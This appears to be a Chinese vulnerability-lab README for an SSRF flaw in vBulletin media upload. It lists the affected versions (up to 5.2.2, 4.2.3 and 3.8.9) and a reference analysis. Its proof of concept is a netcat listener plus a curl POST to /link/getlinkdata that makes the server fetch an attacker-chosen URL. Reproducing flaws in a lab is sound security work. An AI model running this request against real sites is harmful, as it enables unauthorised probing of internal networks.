## vBulletin MEDIA UPLOAD SSRF 漏洞

测试镜像

* src/vbulletin/5.1.4

影响版本

* vBulletin <= 5.2.2
* vBulletin <= 4.2.3
* vBulletin <= 3.8.9

参考链接

* [vBulletin MEDIA UPLOAD SSRF 漏洞分析](https://paper.seebug.org/24/)

Poc

监听本地端口：

`sudo nc -lvvp 80`

访问地址：

```
curl -d "url=http://172.17.0.1:80/hello_ssrf" "http://172.17.0.2/link/getlinkdata"
```

172.17.0.1为监听的IP地址，172.17.0.2为网站地址
